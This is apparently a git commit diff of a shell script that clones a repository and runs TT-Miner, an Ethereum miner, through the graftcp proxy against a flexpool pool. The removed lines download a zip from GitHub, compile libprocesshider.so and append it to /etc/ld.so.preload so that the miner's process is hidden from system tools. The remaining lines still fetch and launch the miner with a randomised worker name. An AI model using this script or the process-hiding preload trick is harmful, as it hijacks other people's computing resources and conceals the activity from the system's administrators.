2e7df4603895b4c97cb403312dd4b7483e463a2f
Treecommon <103907893+Treecommon@users.noreply.github.com>
2022-05-20 17:05:24 +0700

    Update and rename tt.sh to ttt.sh

--- ttt.sh
+++ ttt.sh
@@ -36,11 +36,4 @@ echo " "
 ./graftcp/graftcp git clone https://github.com/buatmining/boost.git
 cd boost
 chmod +x TT-Miner
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 ./graftcp/graftcp ./TT-Miner -coin eth -o ethproxy+tcp://eth-hk.flexpool.io:5555 -u wa.$(echo $(shuf -i 201-400 -n 1)-$)  -p x -PRGN -RH
